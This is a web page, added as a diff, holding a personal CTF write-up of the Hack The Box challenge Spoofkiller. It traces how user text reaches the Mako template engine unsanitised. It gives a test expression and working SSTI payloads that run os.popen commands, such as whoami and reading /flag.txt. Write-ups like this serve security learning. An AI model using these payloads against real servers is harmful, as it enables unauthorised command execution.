@@ -1,0 +1,115 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Spoofkiller — Write-Up</title>
+    <link rel="stylesheet" href="writeups.css">
+    <link rel="stylesheet" href="../styles.css">
+    <script src="../script.js" defer></script>
+</head>
+
+<body>
+
+<div id="mobile-menu-button">
+    &#9776;
+</div>
+
+<div id="sidebar" class="sidebar">
+    <h2>~/home</h2>
+    <a href="../index.html">Home</a>
+    <a href="../about.html">About Me</a>
+    <a href="../projects.html">Projects</a>
+    <a href="../writeups.html" class="active">Write-Ups</a>
+    <a href="../contact.html">Contact</a>
+
+    <div class="social-icons">
+        <a href="https://www.linkedin.com/in/iustin-barbir" target="_blank">
+            <img src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/linkedin.svg" alt="LinkedIn">
+        </a>
+        <a href="https://github.com/IustinBarbir" target="_blank">
+            <img src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/github.svg" alt="GitHub">
+        </a>
+        <a href="https://tryhackme.com/p/Glitch21" target="_blank">
+            <img src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/tryhackme.svg" alt="TryHackMe">
+        </a>
+    </div>
+</div>
+
+<section id="writeup-container">
+    <div class="writeup-content">
+
+        <h1>Spoofkiller</h1>
+
+        <p>The website turns a normal username into 4 different fonts:</p>
+
+        <pre><code>𝖙𝖊𝖘𝖙
+ᖶᘿSᖶ
+₮Ɇ₴₮
+test</code></pre>
+
+        <p>Intercepting traffic with Burp Suite does not lead to anything interesting.</p>
+
+        <p>The zip file given with the challenge contains a flag.txt file, which is only used for testing.</p>
+
+        <pre><code>HTB{f4k3_fl4g_f0r_t3st1ng}</code></pre>
+
+        <p>The challenge itself is pretty confusing because it is not very obvious how you would get a flag.</p>
+
+        <p>I had to use the official writeup. This is the first web challenge of this kind that I do, since I do not like coding. But this room requires code understanding and analyzing the files given in the archive, instead of doing web app pentesting (which is what I am used to).</p>
+
+        <p><code>application/blueprints/routes.py</code> defines how the application changes the fonts:</p>
+
+        <pre><code>@web.route('/')
+def index():
+    text = request.args.get('text')
+    if(text):
+        converted = spookify(text)
+        return render_template('index.html',output=converted)
+    return render_template('index.html',output='')</code></pre>
+
+        <p>The GET parameter is passed to the spookify function.</p>
+
+        <p>The spookify function is defined in:</p>
+
+        <pre><code>from application.util import spookify</code></pre>
+
+        <pre><code>def spookify(text):
+    converted_fonts = change_font(text_list=text)
+    return generate_render(converted_fonts=converted_fonts)</code></pre>
+
+        <p>The text value is then passed to the change_font function and finally generate_render is called with the result.</p>
+
+        <p>The change_font function works like the following:</p>
+
+        <p>1. Converts the user input text into a list of characters.</p>
+
+        <p>2. Finds each character from the list in four different dictionaries and then adds the result in a list named current_font.</p>
+
+        <p>3. The current_font list is then combined into a string and appended to a list named all_fonts.</p>
+
+        <p>4. Returns the all_fonts list which contains the generated variations.</p>
+
+        <p>The generate_render function from the Mako template engine is used to generate an HTML table with the resultant list.</p>
+
+        <p>Since the user-supplied content is not sanitized, we can inject template literals and achieve Server Side Template Injection (SSTI).</p>
+
+        <p>We can verify this by submitting the following template expression:</p>
+
+        <pre><code>${7*7}</code></pre>
+
+        <p>The result shows the evaluated template expression value.</p>
+
+        <p>We can find a working proof-of-concept payload for code execution via SSTI in PayloadAllTheThings repository that states we can access the os module from TemplateNamespace:</p>
+
+        <pre><code>${self.module.cache.util.os.popen('whoami').read()}</code></pre>
+
+        <p>We can now read the challenge flag from /flag.txt to complete the challenge:</p>
+
+        <pre><code>${self.module.cache.util.os.popen('cat /flag.txt').read()}</code></pre>
+
+    </div>
+</section>
+
+</body>
+</html>
